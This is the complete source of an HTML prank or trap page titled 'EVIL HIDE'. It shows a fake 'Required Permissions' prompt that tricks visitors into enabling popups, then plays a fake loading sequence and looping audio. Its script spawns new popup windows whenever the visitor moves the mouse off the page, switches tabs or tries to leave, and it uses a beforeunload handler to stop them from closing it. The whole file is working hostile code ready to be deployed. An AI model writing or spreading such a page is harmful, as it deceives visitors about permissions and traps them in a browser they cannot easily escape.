<!DOCTYPE html>
<head>
  <title>EVIL HIDE</title>
  <style>
    /* Combined styles */
    body {
      background: #000000;
      color: #ff0000;
      margin: 0;
      padding: 0;
      overflow: hidden;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Arial Black', sans-serif;
    }

    .floating-text {
      font-size: 4em;
      color: #ff0000;
      text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
      animation: float 2s ease-in-out infinite;
    }

    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-20px); }
      100% { transform: translateY(0px); }
    }

    #modern-loading {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #1a1a1a;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .loading-content {
      text-align: center;
    }

    .evil-text {
      font-family: 'Arial Black', sans-serif;
      font-size: 4em;
      color: #ff0000;
      margin-bottom: 40px;
      text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
      animation: pulse 2s infinite;
    }

    .loader {
      width: 300px;
      margin: 0 auto;
    }

    .progress-bar {
      width: 100%;
      height: 4px;
      background: #333;
      border-radius: 2px;
      overflow: hidden;
    }

    .progress {
      width: 0%;
      height: 100%;
      background: #ff0000;
      transition: width 0.5s ease;
    }

    .loading-text {
      color: #ffffff;
      font-family: 'Arial', sans-serif;
      margin-top: 10px;
      font-size: 1.2em;
    }

    .dots {
      animation: loadingDots 1.5s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes loadingDots {
      0% { opacity: .2; }
      20% { opacity: 1; }
      100% { opacity: .2; }
    }

    .permission-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #1a1a1a;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1001;
    }

    .permission-content {
      text-align: center;
      color: #ffffff;
      font-family: 'Arial', sans-serif;
      padding: 20px;
      background: #2a2a2a;
      border-radius: 10px;
    }

    .permission-content h2 {
      margin-bottom: 20px;
    }

    #allow-button {
      padding: 10px 20px;
      font-size: 1.2em;
      background: #ff0000;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s;
    }

    #allow-button:hover {
      background: #cc0000;
    }
  </style>
</head>
<body>
  <div id="permission-request" class="permission-overlay">
    <div class="permission-content">
      <h2>Required Permissions</h2>
      <p>This site needs certain permissions to continue running.</p>
      <button id="allow-button">Continue</button>
    </div>
  </div>

  <div id="modern-loading" style="display: none;">
    <div class="loading-content">
      <div class="evil-text">EVIL HIDE</div>
      <div class="loader">
        <div class="progress-bar">
          <div class="progress"></div>
        </div>
        <div class="loading-text">Loading<span class="dots">...</span></div>
      </div>
    </div>
  </div>

  <div id="retro-content" style="display: none;">
    <div class="floating-text">EVIL HIDE</div>
  </div>

  <audio id="bgMusic" loop>
    <source src="https://files.catbox.moe/63a63h.mp3" type="audio/mpeg">
  </audio>

  <script>
    // Combined JavaScript
    let windows = [];

    function createNewWindow() {
      const width = 800;
      const height = 600;
      const left = Math.round(Math.random() * (screen.width - width));
      const top = Math.round(Math.random() * (screen.height - height));
      
      const win = window.open(
        'about:blank',
        '',
        `width=${width},height=${height},left=${left},top=${top}`
      );
      
      if (win) {
        win.document.write(`
          <!DOCTYPE html>
          <head>
            <title>EVIL HIDE</title>
            <style>
              body {
                background: #000000;
                color: #ff0000;
                margin: 0;
                padding: 0;
                overflow: hidden;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: 'Arial Black', sans-serif;
              }
              .floating-text {
                font-size: 4em;
                color: #ff0000;
                text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
                animation: float 2s ease-in-out infinite;
              }
              @keyframes float {
                0% { transform: translateY(0px); }
                50% { transform: translateY(-20px); }
                100% { transform: translateY(0px); }
              }
            </style>
          </head>
          <body>
            <div class="floating-text">EVIL HIDE</div>
          </body>
        `);
        windows.push(win);
        win.onbeforeunload = () => {
          windows = windows.filter(w => !w.closed);
        };
      }
    }

    window.onbeforeunload = (e) => {
      createNewWindow();
      createNewWindow();
      
      e.preventDefault();
      e.returnValue = '';
      return '';
    };

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        createNewWindow();
      }
    });

    document.addEventListener('mouseleave', () => {
      createNewWindow();
    });

    setInterval(() => {
      windows = windows.filter(w => !w.closed);
    }, 1000);

    document.addEventListener('DOMContentLoaded', () => {
      const permissionRequest = document.getElementById('permission-request');
      const allowButton = document.getElementById('allow-button');
      const modernLoading = document.getElementById('modern-loading');
      const progress = document.querySelector('.progress');
      const retroContent = document.getElementById('retro-content');
      const audio = document.getElementById('bgMusic');

      allowButton.addEventListener('click', () => {
        const testPopup = window.open('about:blank', '_blank');
        if (testPopup) {
          testPopup.close();
          permissionRequest.style.display = 'none';
          modernLoading.style.display = 'flex';
          startLoading();
        } else {
          alert('Please enable popups in your browser settings and try again.');
        }
      });

      function startLoading() {
        let loaded = 0;
        const interval = setInterval(() => {
          loaded += Math.random() * 15;
          if (loaded > 100) {
            loaded = 100;
            clearInterval(interval);
            
            setTimeout(() => {
              modernLoading.style.transition = 'opacity 1s';
              modernLoading.style.opacity = '0';
              
              setTimeout(() => {
                modernLoading.style.display = 'none';
                retroContent.style.display = 'block';
                audio.play().catch(e => console.log('Audio autoplay blocked'));
              }, 1000);
            }, 500);
          }
          progress.style.width = loaded + '%';
        }, 200);
      }
    });
  </script>
</body>
</html>
